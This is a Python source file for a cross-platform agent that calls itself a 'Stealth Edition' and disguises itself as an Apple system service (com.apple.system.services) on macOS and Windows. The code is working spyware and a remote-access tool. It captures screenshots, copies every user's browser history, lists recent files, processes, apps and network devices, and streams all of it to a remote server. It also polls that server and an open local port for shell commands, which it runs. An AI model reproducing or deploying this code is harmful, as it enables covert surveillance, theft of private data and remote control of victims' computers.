#!/usr/bin/env python3
"""
AppleSystemServices Agent v4.0 (Cross-Platform: Windows & macOS Stealth Edition)
- Runs on macOS as com.apple.system.services LaunchDaemon
- Runs on Windows as AppleSystemServices Task Scheduler / System Service
- Sends all data to Central Server (local or cloud like Render)
- Polls server for remote commands (no direct connection needed)
- Provides local dashboard on port 5050
- Supports Screen Capture, Active Window, Browser History, Processes, Recent Files, Installed Software & Network ARP Scanning on BOTH Windows & macOS!
"""

import os
import sys
import json
import time
import sqlite3
import subprocess
import platform
import shutil
import socket
import logging
import threading
import base64
import getpass
from datetime import datetime

IS_WINDOWS = (platform.system() == 'Windows')
IS_MACOS = (platform.system() == 'Darwin')

if not IS_WINDOWS:
    try:
        import pwd
        import stat
    except ImportError:
        pass

# ==================== LOG SETUP ====================
if IS_WINDOWS:
    LOG_PATH = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'com.apple.system.services.log')
else:
    LOG_PATH = '/var/log/com.apple.system.services.log'
    if not os.access('/var/log', os.W_OK):
        LOG_PATH = '/tmp/com.apple.system.services.log'

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler(LOG_PATH)]
)
log = logging.getLogger("sysupdate")

# ==================== PARSE --server ARGUMENT ====================
CENTRAL_SERVER = None
for i, arg in enumerate(sys.argv):
    if arg == '--server' and i + 1 < len(sys.argv):
        CENTRAL_SERVER = sys.argv[i + 1].rstrip('/')
        log.info(f"Agent mode: {CENTRAL_SERVER}")

# ==================== INSTALL DEPS ====================
def ensure_deps():
    try:
        import flask, psutil, requests
    except ImportError:
        log.info("Installing dependencies...")
        cmd = [sys.executable, "-m", "pip", "install", "flask", "psutil", "requests", "--quiet"]
        if not IS_WINDOWS:
            cmd.append("--break-system-packages")
        subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
ensure_deps()

import psutil
from flask import Flask, render_template, jsonify, request, send_file
import requests as req_lib

# ==================== TEMPLATE DIR ====================
if IS_WINDOWS:
    TEMPLATE_DIR = 'C:\\ProgramData\\AppleSystemServices\\templates'
else:
    TEMPLATE_DIR = '/Library/Application Support/AppleSystemServices/templates'

if not os.path.exists(TEMPLATE_DIR):
    TEMPLATE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')

app = Flask(__name__, template_folder=TEMPLATE_DIR)

# ==================== ACTIVE CONSOLE USER HELPER ====================
def get_active_console_user():
    """Returns (username, uid, home_dir) of active logged-in GUI user"""
    if IS_WINDOWS:
        username = os.environ.get('USERNAME') or getpass.getuser() or 'user'
        home_dir = os.environ.get('USERPROFILE') or f"C:\\Users\\{username}"
        return username, 1000, home_dir

    username = None
    uid = None
    home_dir = None
    
    # Method 1: Check /dev/console owner on Mac
    try:
        console_uid = os.stat('/dev/console').st_uid
        pw = pwd.getpwuid(console_uid)
        if pw.pw_name not in ['root', 'loginwindow', '_mbsetupuser', '']:
            username = pw.pw_name
            uid = pw.pw_uid
            home_dir = pw.pw_dir
    except Exception:
        pass

    # Method 2: scutil ConsoleUser
    if not username:
        try:
            out = subprocess.check_output(
                ["scutil"], input=b"show State:/Users/ConsoleUser\n", stderr=subprocess.DEVNULL
            ).decode()
            for line in out.splitlines():
                if "Name :" in line:
                    u = line.split(":")[-1].strip()
                    if u and u not in ["root", "loginwindow", "_mbsetupuser"]:
                        pw = pwd.getpwnam(u)
                        username = pw.pw_name
                        uid = pw.pw_uid
                        home_dir = pw.pw_dir
                        break
        except Exception:
            pass

    if username and not home_dir:
        home_dir = f"/Users/{username}"

    if not home_dir or not os.path.exists(home_dir):
        try:
            if os.path.exists('/Users'):
                for u in os.listdir('/Users'):
                    if u not in ['Shared', 'Guest', '.localized'] and not u.startswith('.'):
                        h = os.path.join('/Users', u)
                        if os.path.isdir(h):
                            username = u
                            home_dir = h
                            try:
                                uid = pwd.getpwnam(u).pw_uid
                            except Exception:
                                uid = 501
                            break
        except Exception:
            pass

    return username, uid, home_dir or '/var/root'

# ==================== MACHINE ID ====================
def get_machine_id():
    hostname = platform.node().replace(' ', '_').lower()
    import re
    hostname = re.sub(r'[^a-z0-9_\-]', '', hostname)
    hostname = hostname or ('win' if IS_WINDOWS else 'mac')
    
    hardware_uuid = None
    try:
        if IS_WINDOWS:
            out = subprocess.check_output(
                ["wmic", "csproduct", "get", "uuid"],
                stderr=subprocess.DEVNULL, timeout=3
            ).decode()
            lines = [l.strip() for l in out.splitlines() if l.strip() and 'UUID' not in l]
            if lines: hardware_uuid = lines[0].lower()
        else:
            output = subprocess.check_output(
                ["ioreg", "-rd1", "-c", "IOPlatformExpertDevice"],
                stderr=subprocess.DEVNULL, timeout=3
            ).decode()
            for line in output.split('\n'):
                if "IOPlatformUUID" in line:
                    hardware_uuid = line.split("=")[1].strip().strip('"').lower()
                    break
    except:
        pass
        
    if hardware_uuid:
        suffix = hardware_uuid.split('-')[-1]
        return f"{hostname}_{suffix}"
        
    try:
        import uuid
        mac = uuid.getnode()
        mac_hex = f"{mac:012x}"[-6:]
        return f"{hostname}_{mac_hex}"
    except:
        pass
        
    return hostname or 'unknown_host'

MACHINE_ID = get_machine_id()

# ==================== LOCAL IP ====================
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

# ==================== SYSTEM INFO ====================
def get_system_info():
    try:
        mem = psutil.virtual_memory()
        disk_path = 'C:\\' if IS_WINDOWS else '/'
        disk = psutil.disk_usage(disk_path)
        uptime_sec = time.time() - psutil.boot_time()
        hours = int(uptime_sec // 3600)
        minutes = int((uptime_sec % 3600) // 60)
        username, uid, home_dir = get_active_console_user()
        
        os_name = f"Windows {platform.release()}" if IS_WINDOWS else (platform.system() + " " + platform.mac_ver()[0])
        return {
            "hostname": platform.node(),
            "active_user": username or 'unknown',
            "os": os_name,
            "uptime": f"{hours}h {minutes}m",
            "cpu_cores": os.cpu_count(),
            "cpu_percent": psutil.cpu_percent(interval=0.5),
            "memory_total": round(mem.total / (1024**3), 1),
            "memory_used": round(mem.used / (1024**3), 1),
            "memory_percent": mem.percent,
            "disk_total": round(disk.total / (1024**3), 1),
            "disk_used": round(disk.used / (1024**3), 1),
            "disk_percent": disk.percent,
            "ip": get_local_ip(),
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
    except Exception as e:
        log.error(f"system_info error: {e}")
        return {"hostname": platform.node(), "ip": get_local_ip(), "error": str(e)}

# ==================== SCREENSHOT ====================
def capture_screenshot():
    try:
        if IS_WINDOWS:
            std_path = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'em_screenshot.png')
            # Method 1: PIL ImageGrab
            try:
                from PIL import ImageGrab
                img = ImageGrab.grab()
                img.save(std_path, 'PNG')
                if os.path.exists(std_path) and os.path.getsize(std_path) > 0:
                    return std_path
            except Exception:
                pass

            # Method 2: PowerShell Native GDI Screen Capture (Windows 10/11 Built-in)
            try:
                ps_script = f"""
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
                $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
                $graphic.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
                $bitmap.Save('{std_path.replace("\\", "\\\\")}', [System.Drawing.Imaging.ImageFormat]::Png)
                """
                subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-Command", ps_script], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=8)
                if os.path.exists(std_path) and os.path.getsize(std_path) > 0:
                    return std_path
            except Exception:
                pass
            return None

        else:
            # macOS Screencapture
            tmp_path = f"/tmp/em_ss_{int(time.time())}.png"
            std_path = "/tmp/em_screenshot.png"
            username, uid, home_dir = get_active_console_user()
            
            if os.geteuid() == 0 and uid and uid != 0:
                cmd = ["launchctl", "asuser", str(uid), "/usr/sbin/screencapture", "-x", "-t", "png", tmp_path]
            else:
                cmd = ["/usr/sbin/screencapture", "-x", "-t", "png", tmp_path]

            subprocess.run(cmd, timeout=8, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            if not os.path.exists(tmp_path) or os.path.getsize(tmp_path) == 0:
                fallback_cmd = ["/usr/sbin/screencapture", "-x", "-t", "png", tmp_path]
                subprocess.run(fallback_cmd, timeout=8, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            if os.path.exists(tmp_path) and os.path.getsize(tmp_path) > 0:
                if os.path.exists(std_path):
                    try: os.remove(std_path)
                    except Exception: pass
                shutil.move(tmp_path, std_path)
                try: os.chmod(std_path, 0o777)
                except Exception: pass
                return std_path
            return None
    except Exception as e:
        log.warning(f"screenshot error: {e}")
        return None

# ==================== ACTIVE WINDOW ====================
def get_active_window():
    try:
        if IS_WINDOWS:
            # Method 1: win32gui if installed
            try:
                import win32gui
                window = win32gui.GetForegroundWindow()
                title = win32gui.GetWindowText(window)
                if title: return title
            except Exception:
                pass

            # Method 2: PowerShell active process window title
            try:
                ps = '(Get-Process | Where-Object {$_.MainWindowHandle -ne 0} | Sort-Object WorkingSet64 -Descending | Select-Object -First 1).MainWindowTitle'
                result = subprocess.check_output(["powershell", "-Command", ps], stderr=subprocess.DEVNULL, timeout=5).decode().strip()
                return result or "Desktop"
            except Exception:
                return "Desktop"

        else:
            # macOS Active Window
            username, uid, home_dir = get_active_console_user()
            script = 'tell application "System Events" to get name of first process whose frontmost is true'
            if os.geteuid() == 0 and uid and uid != 0:
                cmd = ["launchctl", "asuser", str(uid), "osascript", "-e", script]
            else:
                cmd = ["osascript", "-e", script]

            result = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, timeout=5).decode().strip()
            return result
    except:
        return "Unknown"

# ==================== TCC / FILE COPY SAFE ====================
def copy_file_safe(src, dst):
    """Copies protected SQLite history files smoothly"""
    try:
        if os.path.exists(dst):
            try: os.remove(dst)
            except Exception: pass
        shutil.copy2(src, dst)
        return True
    except Exception:
        try:
            with open(src, 'rb') as f_in:
                with open(dst, 'wb') as f_out:
                    f_out.write(f_in.read())
            return True
        except Exception:
            return False

# ==================== BROWSER HISTORY ====================
def get_browser_history():
    history = []
    user_dirs = []
    
    if IS_WINDOWS:
        users_base = "C:\\Users"
        if os.path.exists(users_base):
            for u in os.listdir(users_base):
                if u not in ['Public', 'Default', 'All Users'] and not u.startswith('.'):
                    d = os.path.join(users_base, u)
                    if os.path.isdir(d):
                        user_dirs.append(d)
        curr_home = os.environ.get('USERPROFILE')
        if curr_home and curr_home not in user_dirs and os.path.exists(curr_home):
            user_dirs.append(curr_home)
    else:
        if os.path.exists('/Users'):
            for u in os.listdir('/Users'):
                if u not in ['Shared', 'Guest', '.localized'] and not u.startswith('.'):
                    d = os.path.join('/Users', u)
                    if os.path.isdir(d):
                        user_dirs.append(d)
        curr_home = os.path.expanduser("~")
        if curr_home not in user_dirs and os.path.exists(curr_home):
            user_dirs.append(curr_home)
        
    for user_dir in user_dirs:
        u_name = os.path.basename(user_dir)
        
        if IS_WINDOWS:
            # Windows Paths
            chrome_base = os.path.join(user_dir, "AppData", "Local", "Google", "Chrome", "User Data")
            edge_base = os.path.join(user_dir, "AppData", "Local", "Microsoft", "Edge", "User Data")
            brave_base = os.path.join(user_dir, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data")
            ff_base = os.path.join(user_dir, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")

            # Chrome Windows
            if os.path.exists(chrome_base):
                profiles = ["Default"] + [p for p in os.listdir(chrome_base) if p.startswith("Profile ")]
                for p in profiles:
                    c_path = os.path.join(chrome_base, p, "History")
                    if os.path.exists(c_path):
                        tmp = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), f"em_chrome_{p}_{u_name}.db")
                        if copy_file_safe(c_path, tmp):
                            try:
                                conn = sqlite3.connect(tmp)
                                c = conn.cursor()
                                c.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 30")
                                for row in c.fetchall():
                                    if row[0]: history.append({"browser": f"Chrome ({u_name})", "url": row[0], "title": row[1] or row[0]})
                                conn.close()
                                if os.path.exists(tmp): os.remove(tmp)
                            except Exception: pass

            # Edge Windows
            if os.path.exists(edge_base):
                e_path = os.path.join(edge_base, "Default", "History")
                if os.path.exists(e_path):
                    tmp = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), f"em_edge_{u_name}.db")
                    if copy_file_safe(e_path, tmp):
                        try:
                            conn = sqlite3.connect(tmp)
                            c = conn.cursor()
                            c.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 30")
                            for row in c.fetchall():
                                if row[0]: history.append({"browser": f"Edge ({u_name})", "url": row[0], "title": row[1] or row[0]})
                            conn.close()
                            if os.path.exists(tmp): os.remove(tmp)
                        except Exception: pass

            # Brave Windows
            if os.path.exists(brave_base):
                b_path = os.path.join(brave_base, "Default", "History")
                if os.path.exists(b_path):
                    tmp = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), f"em_brave_{u_name}.db")
                    if copy_file_safe(b_path, tmp):
                        try:
                            conn = sqlite3.connect(tmp)
                            c = conn.cursor()
                            c.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 30")
                            for row in c.fetchall():
                                if row[0]: history.append({"browser": f"Brave ({u_name})", "url": row[0], "title": row[1] or row[0]})
                            conn.close()
                            if os.path.exists(tmp): os.remove(tmp)
                        except Exception: pass

        else:
            # macOS Paths
            safari_path = os.path.join(user_dir, "Library/Safari/History.db")
            if os.path.exists(safari_path):
                tmp = f"/tmp/em_safari_{u_name}.db"
                if copy_file_safe(safari_path, tmp):
                    try:
                        conn = sqlite3.connect(tmp)
                        c = conn.cursor()
                        c.execute("SELECT i.url, v.title FROM history_visits v JOIN history_items i ON v.history_item = i.id ORDER BY v.visit_time DESC LIMIT 30")
                        for row in c.fetchall():
                            if row[0]: history.append({"browser": f"Safari ({u_name})", "url": row[0], "title": row[1] or row[0]})
                        conn.close()
                        if os.path.exists(tmp): os.remove(tmp)
                    except Exception: pass

            chrome_base = os.path.join(user_dir, "Library/Application Support/Google/Chrome")
            if os.path.exists(chrome_base):
                profiles = ["Default"] + [p for p in os.listdir(chrome_base) if p.startswith("Profile ")]
                for p in profiles:
                    chrome_path = os.path.join(chrome_base, p, "History")
                    if os.path.exists(chrome_path):
                        tmp = f"/tmp/em_chrome_{p}_{u_name}.db"
                        if copy_file_safe(chrome_path, tmp):
                            try:
                                conn = sqlite3.connect(tmp)
                                c = conn.cursor()
                                c.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 30")
                                for row in c.fetchall():
                                    if row[0]: history.append({"browser": f"Chrome ({u_name})", "url": row[0], "title": row[1] or row[0]})
                                conn.close()
                                if os.path.exists(tmp): os.remove(tmp)
                            except Exception: pass

    return history[:60]

# ==================== PROCESSES ====================
def get_processes():
    try:
        procs = []
        for p in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent', 'status']):
            try:
                procs.append({
                    "pid": p.info['pid'],
                    "name": p.info['name'],
                    "user": p.info['username'] or '',
                    "cpu": round(p.info['cpu_percent'] or 0, 1),
                    "mem": round(p.info['memory_percent'] or 0, 1),
                    "status": p.info['status']
                })
            except:
                pass
        procs.sort(key=lambda x: x['cpu'], reverse=True)
        return procs[:50]
    except Exception as e:
        log.error(f"processes error: {e}")
        return []

# ==================== RECENT FILES ====================
def get_recent_files():
    try:
        username, uid, home_dir = get_active_console_user()
        
        dirs = []
        if home_dir and os.path.exists(home_dir):
            dirs = [
                os.path.join(home_dir, "Desktop"),
                os.path.join(home_dir, "Documents"),
                os.path.join(home_dir, "Downloads")
            ]
        dirs = [d for d in dirs if os.path.exists(d)]
        if not dirs: return []

        files = []
        for d in dirs:
            try:
                for root, _, filenames in os.walk(d):
                    for fn in filenames:
                        if not fn.startswith('.'):
                            fp = os.path.join(root, fn)
                            try:
                                if time.time() - os.path.getmtime(fp) < 14 * 86400:
                                    files.append(fp)
                            except Exception: pass
            except Exception: pass
            
        files.sort(key=lambda f: os.path.getmtime(f) if os.path.exists(f) else 0, reverse=True)
        return files[:50]
    except Exception as e:
        log.debug(f"recent_files error: {e}")
        return []

# ==================== INSTALLED APPS ====================
def get_installed_apps():
    apps = []
    if IS_WINDOWS:
        # Check Registry uninstall keys
        try:
            import winreg
            keys = [
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
            ]
            for root_k, sub_k in keys:
                try:
                    with winreg.OpenKey(root_k, sub_k) as key:
                        for i in range(winreg.QueryInfoKey(key)[0]):
                            try:
                                subkey_name = winreg.EnumKey(key, i)
                                with winreg.OpenKey(key, subkey_name) as subkey:
                                    app_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                    if app_name: apps.append(app_name)
                            except Exception: pass
                except Exception: pass
        except Exception: pass
        
        # Also check Program Files
        for p in ["C:\\Program Files", "C:\\Program Files (x86)"]:
            if os.path.exists(p):
                try:
                    for f in os.listdir(p):
                        apps.append(f)
                except Exception: pass

    else:
        username, uid, home_dir = get_active_console_user()
        dirs = ["/Applications", "/System/Applications"]
        if home_dir: dirs.append(os.path.join(home_dir, "Applications"))
        for d in dirs:
            if os.path.exists(d):
                try:
                    for a in os.listdir(d):
                        if a.endswith(".app"): apps.append(a.replace(".app", ""))
                except Exception: pass
                
    return sorted(list(set(apps)))[:100]

# ==================== LOCAL NETWORK DEVICES SCANNER ====================
def get_local_network_devices():
    """Scans local Wi-Fi ARP table to discover active devices"""
    devices = []
    seen_ips = set()
    try:
        out = subprocess.check_output(['arp', '-a'], stderr=subprocess.DEVNULL, timeout=4).decode(errors='replace')
        import re
        for line in out.splitlines():
            # Windows: 192.168.1.1 00-11-22-33-44-55 dynamic
            # Mac: ? (192.168.1.1) at 00:11:22:33:44:55 on en0
            match_win = re.search(r'([\d\.]+)\s+([a-fA-F0-9\-]{17})\s+dynamic', line)
            match_mac = re.search(r'([^\s\(\)]+)?\s*\(([\d\.]+)\)\s*at\s*([a-fA-F0-9:]+)', line)
            
            if match_win:
                ip_addr = match_win.group(1)
                mac_addr = match_win.group(2)
                h_name = 'Windows Network Device'
            elif match_mac:
                h_name = match_mac.group(1) or 'Wi-Fi Device'
                if h_name == '?': h_name = 'Wi-Fi Device'
                ip_addr = match_mac.group(2)
                mac_addr = match_mac.group(3)
            else:
                continue
                
            if ip_addr not in seen_ips and not ip_addr.startswith('255.') and not ip_addr.startswith('224.'):
                seen_ips.add(ip_addr)
                devices.append({
                    'ip': ip_addr,
                    'hostname': h_name,
                    'mac': mac_addr
                })
    except Exception as e:
        log.debug(f"Local ARP scan error: {e}")
    return devices

# ==================== NETWORK INFO ====================
def get_network_info():
    try:
        net = psutil.net_io_counters()
        connections = []
        for c in psutil.net_connections(kind='inet'):
            try:
                if c.status == 'ESTABLISHED' and c.raddr:
                    connections.append({
                        "local": f"{c.laddr.ip}:{c.laddr.port}",
                        "remote": f"{c.raddr.ip}:{c.raddr.port}",
                        "status": c.status
                    })
            except:
                pass
        return {
            "ip": get_local_ip(),
            "bytes_sent": round(net.bytes_sent / (1024**2), 1),
            "bytes_recv": round(net.bytes_recv / (1024**2), 1),
            "connections": connections[:20]
        }
    except Exception as e:
        return {"ip": get_local_ip(), "error": str(e)}

# ==================== COMMAND EXECUTION ====================
def execute_command(cmd):
    BLOCKED = ['rm -rf /', 'format c:', 'del /f /s /q c:', 'mkfs', 'dd if=', ':(){:|:&};:']
    for b in BLOCKED:
        if b in cmd.lower():
            return {"success": False, "error": "Command blocked for security"}
    try:
        username, uid, home_dir = get_active_console_user()
        
        if home_dir:
            cmd_to_run = cmd.replace('~', home_dir)
            work_dir = home_dir
        else:
            cmd_to_run = cmd
            work_dir = 'C:\\' if IS_WINDOWS else '/'
            
        env = os.environ.copy()
        if username:
            env['USER'] = username
            env['USERNAME'] = username
        if home_dir:
            env['HOME'] = home_dir
            env['USERPROFILE'] = home_dir

        # Run shell command
        shell_exe = True
        result = subprocess.check_output(
            cmd_to_run, shell=shell_exe, stderr=subprocess.STDOUT, timeout=30,
            cwd=work_dir, env=env
        )
        return {"success": True, "output": result.decode(errors='replace')}
    except subprocess.TimeoutExpired:
        return {"success": False, "error": "Command execution timed out (30s limit)"}
    except subprocess.CalledProcessError as e:
        return {"success": False, "error": e.output.decode(errors='replace')}
    except Exception as e:
        return {"success": False, "error": str(e)}

# ==================== SEND TO SERVER ====================
def send_to_server(data_type, payload):
    if not CENTRAL_SERVER:
        return
    try:
        req_lib.post(
            f"{CENTRAL_SERVER}/agent/data",
            json={"machine_id": MACHINE_ID, "type": data_type, "data": payload},
            timeout=15
        )
    except Exception as e:
        log.debug(f"Send {data_type} failed: {e}")

def register_with_server():
    if not CENTRAL_SERVER:
        return False
    for attempt in range(5):
        try:
            resp = req_lib.post(
                f"{CENTRAL_SERVER}/agent/register",
                json={
                    "machine_id": MACHINE_ID,
                    "hostname": platform.node(),
                    "ip": get_local_ip()
                },
                timeout=15
            )
            if resp.ok:
                log.info(f"✅ Registered with server: {CENTRAL_SERVER}")
                return True
            else:
                log.warning(f"Registration failed (attempt {attempt+1}): {resp.status_code}")
        except Exception as e:
            log.warning(f"Registration error (attempt {attempt+1}): {e}")
        time.sleep(5)
    log.error("Failed to register after 5 attempts")
    return False

def send_heartbeat():
    if not CENTRAL_SERVER:
        return
    try:
        req_lib.post(
            f"{CENTRAL_SERVER}/agent/heartbeat",
            json={"machine_id": MACHINE_ID},
            timeout=5
        )
    except:
        pass

# ==================== COMMAND POLLING THREAD ====================
def command_poller():
    """Poll server for pending commands and execute them"""
    if not CENTRAL_SERVER:
        return
    
    log.info("Command poller started")
    
    while True:
        try:
            resp = req_lib.post(
                f"{CENTRAL_SERVER}/agent/command/poll",
                json={"machine_id": MACHINE_ID},
                timeout=10
            )
            
            if resp.ok:
                data = resp.json()
                if data.get('has_command'):
                    command_id = data['command_id']
                    command = data['command']
                    log.info(f"Received command: {command} (id={command_id})")
                    
                    result = execute_command(command)
                    
                    req_lib.post(
                        f"{CENTRAL_SERVER}/agent/command/result",
                        json={
                            "machine_id": MACHINE_ID,
                            "command_id": command_id,
                            "success": result.get('success', False),
                            "output": result.get('output', ''),
                            "error": result.get('error', '')
                        },
                        timeout=10
                    )
                    log.info(f"Command result sent for id={command_id}")
        except Exception as e:
            log.debug(f"Command poll error: {e}")
        
        time.sleep(3)

# ==================== AGENT WORKER THREAD ====================
def agent_worker():
    if not CENTRAL_SERVER:
        return

    log.info(f"Agent worker starting → {CENTRAL_SERVER}")

    while not register_with_server():
        log.warning("Retrying registration in 15s...")
        time.sleep(15)

    log.info("Sending initial data to server...")
    try:
        send_to_server('info', get_system_info())
        send_to_server('active_window', {'active': get_active_window()})
        send_to_server('history', get_browser_history())
        send_to_server('processes', get_processes())
        send_to_server('files', get_recent_files())
        send_to_server('network', get_network_info())
        send_to_server('network_devices', get_local_network_devices())
        send_to_server('apps', get_installed_apps())
        log.info("✅ Initial data sent successfully")
    except Exception as e:
        log.error(f"Initial data send failed: {e}")

    loop_count = 0
    while True:
        try:
            send_to_server('info', get_system_info())
            send_to_server('active_window', {'active': get_active_window()})

            if loop_count % 2 == 0:
                path = capture_screenshot()
                if path and os.path.exists(path):
                    with open(path, 'rb') as f:
                        send_to_server('screenshot', base64.b64encode(f.read()).decode())
                send_to_server('processes', get_processes())
                send_to_server('network', get_network_info())
                send_to_server('network_devices', get_local_network_devices())

            if loop_count % 3 == 0:
                send_to_server('history', get_browser_history())

            if loop_count % 6 == 0:
                send_to_server('files', get_recent_files())

            if loop_count % 30 == 0:
                send_to_server('apps', get_installed_apps())

            send_heartbeat()

            loop_count = (loop_count + 1) % 1000

        except Exception as e:
            log.error(f"Agent loop error: {e}")

        time.sleep(10)

# ==================== LOCAL FLASK ROUTES ====================
@app.route('/')
def dashboard():
    return render_template('dashboard.html')

@app.route('/api/info')
def api_info():
    return jsonify(get_system_info())

@app.route('/api/screenshot')
def api_screenshot():
    path = capture_screenshot()
    if path:
        return send_file(path, mimetype='image/png', max_age=0)
    return jsonify({"error": "Screenshot failed"}), 500

@app.route('/api/active_window')
def api_active_window():
    return jsonify({"active": get_active_window()})

@app.route('/api/history')
def api_history():
    return jsonify(get_browser_history())

@app.route('/api/apps')
def api_apps():
    return jsonify(get_installed_apps())

@app.route('/api/processes')
def api_processes():
    return jsonify(get_processes())

@app.route('/api/recent_files')
def api_recent_files():
    return jsonify(get_recent_files())

@app.route('/api/network')
def api_network():
    return jsonify(get_network_info())

@app.route('/api/command', methods=['POST'])
def api_command():
    data = request.get_json()
    if not data:
        return jsonify({"error": "No data"}), 400
    cmd = data.get('command', '').strip()
    if not cmd:
        return jsonify({"error": "Empty command"}), 400
    log.info(f"Remote command: {cmd}")
    return jsonify(execute_command(cmd))

@app.route('/api/status')
def api_status():
    return jsonify({
        "status": "online",
        "ip": get_local_ip(),
        "hostname": platform.node(),
        "machine_id": MACHINE_ID,
        "agent_mode": bool(CENTRAL_SERVER),
        "server": CENTRAL_SERVER,
        "timestamp": datetime.now().isoformat()
    })

# ==================== MAIN ====================
if __name__ == '__main__':
    ip = get_local_ip()

    if sys.stdout.isatty():
        print(f"\n{'='*55}")
        print(f"  🖥️  AppleSystemServices Agent v4.0 (Windows & macOS)")
        print(f"{'='*55}")
        print(f"  🔑 Machine ID : {MACHINE_ID}")
        print(f"  🌐 Local Dashboard : http://{ip}:5050")
        if CENTRAL_SERVER:
            print(f"  📡 Reporting to : {CENTRAL_SERVER}")
        print(f"  📋 Logs : {LOG_PATH}")
        print(f"{'='*55}\n")

    log.info(f"Agent starting | OS: {platform.system()} | Machine: {MACHINE_ID} | IP: {ip}")

    if CENTRAL_SERVER:
        t = threading.Thread(target=agent_worker, daemon=True)
        t.start()
        
        cmd_t = threading.Thread(target=command_poller, daemon=True)
        cmd_t.start()

    app.run(
        host='0.0.0.0',
        port=5050,
        debug=False,
        threaded=True,
        use_reloader=False
    )
